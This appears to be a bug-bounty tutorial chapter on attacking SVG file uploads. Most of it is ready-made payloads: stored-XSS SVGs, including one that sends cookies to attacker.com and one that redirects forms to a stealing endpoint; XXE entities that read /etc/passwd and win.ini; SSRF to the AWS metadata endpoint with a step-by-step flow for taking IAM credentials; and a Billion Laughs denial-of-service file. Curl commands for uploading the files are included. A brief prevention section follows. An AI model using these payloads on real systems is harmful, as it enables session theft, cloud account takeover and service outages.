# 3.2 XSS & XXE SVG Injection

## Part 1: Stored XSS via SVG Upload

### Goal

Upload SVG file containing JavaScript that executes in victim's browser, causing client-side compromise.

### SVG XSS Payloads

**Payload 1: Simple Script Tag**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
</svg>
```

**Payload 2: Event Handler**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onmouseover="alert('XSS')">
  <circle cx="50" cy="50" r="40" />
</svg>
```

**Payload 3: Image Tag**

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="x" onerror="alert('XSS')" />
</svg>
```

**Payload 4: Stealcookies.js**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com/log?cookie=' + document.cookie)">
</svg>
```

**Payload 5: Form Hijacking**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="
  var f = document.querySelector('form');
  f.action = 'http://attacker.com/steal';
">
</svg>
```

### Testing SVG XSS

```bash
# 1. Create SVG with XSS
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
</svg>
EOF

# 2. Upload
curl -F "file=@xss.svg" http://target/upload.php

# 3. Access uploaded file in browser
# Alert should trigger → Stored XSS confirmed
```

## Part 2: XXE via SVG Upload

### Why SVG is Vulnerable to XXE

SVG = Scalable Vector Graphics = XML-based format
Server-side processing for:
- Thumbnail generation
- Format conversion
- Metadata extraction
- Validation

If server processes SVG server-side → XXE vulnerability!

### XXE Payloads

**Payload 1: Local File Read**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**How it works:**
```
1. Server processes SVG
2. XML parser encounters <!ENTITY xxe SYSTEM "file:///etc/passwd">
3. Parser reads /etc/passwd file
4. Content replaced in XML
5. Attacker gets file contents
```

**Payload 2: Windows File Read**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Payload 3: SSRF to AWS Metadata**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**How it works:**
```
1. Server processes SVG
2. XML parser fetches internal AWS endpoint
3. Returns IAM credentials
4. Attacker gains AWS access
5. Full account compromise possible
```

**Payload 4: Internal Service Enumeration**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Payload 5: SSRF to Database**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://internal-db:3306/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### XXE Testing

```bash
# 1. Create XXE SVG
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
EOF

# 2. Upload
curl -F "file=@xxe.svg" http://target/upload.php

# 3. Check response/stored content for /etc/passwd
curl http://target/uploads/xxe.svg

# If file contents appear in response → XXE VULNERABLE
```

## Part 3: SSRF via XXE to AWS Metadata

### High-Value Target: AWS Credentials

**Payload for AWS:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### Exploitation Flow

```
1. Upload XXE SVG
2. Server processes SVG
3. XXE fetches AWS metadata endpoint
4. Returns: Role name (e.g., "MyRole")
5. Upload again with: 
   http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
6. Returns: AccessKeyId, SecretAccessKey, SessionToken
7. Credentials allow full AWS API access
8. ACCOUNT COMPROMISE
```

### Bounty Example

```
Finding: XXE via SVG upload → AWS credential leak
Impact: Full AWS account compromise
Bounty: $5,000-$25,000+ (very high value!)
```

## Part 4: Billion Laughs Attack (DoS)

### Goal

Cause server resource exhaustion by expanding XML entities exponentially.

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

**How it works:**
```
lol = "lol" (3 bytes)
lol2 = lol repeated 10x = 30 bytes
lol3 = lol2 repeated 10x = 300 bytes
lol4 = lol3 repeated 10x = 3,000 bytes
lol5 = lol4 repeated 10x = 30,000 bytes
...exponentially grows...

Result: Server runs out of memory/CPU
Effect: Denial of Service
```

## Prevention (For Developers)

❌ **Bad:** Process SVG without validation

```php
// VULNERABLE
$svg = file_get_contents($_FILES['file']['tmp_name']);
$xml = simplexml_load_string($svg);
echo $xml->asXML();
```

✅ **Good:** Disable XXE

```php
// SAFE - XXE disabled
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->load($_FILES['file']['tmp_name']);
```

✅ **Better:** Re-encode SVG

```php
// Safest - Rebuild SVG from scratch
$svg = file_get_contents($_FILES['file']['tmp_name']);
$image = new Imagick();
$image->readImageBlob($svg);

// This sanitizes the SVG completely
$clean_svg = $image->getImageBlob();
```

✅ **Best:** Store outside web root

```php
// Store in non-web-accessible location
$upload_dir = '/home/user/private_uploads/';
$filename = uniqid() . '.svg';
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $filename);

// Serve via PHP with proper headers
// header('Content-Type: image/svg+xml');
// readfile($upload_dir . $filename);
```

## Detection Indicators

**SVG XSS vulnerable if:**
- ✅ JavaScript triggers when image viewed
- ✅ Alert/event handler executes
- ✅ Cookie/data exfiltrated
- ✅ Form hijacking works

**SVG XXE vulnerable if:**
- ✅ File contents appear in response
- ✅ Server fetches internal URLs
- ✅ AWS metadata endpoint returns data
- ✅ Error messages reveal file paths
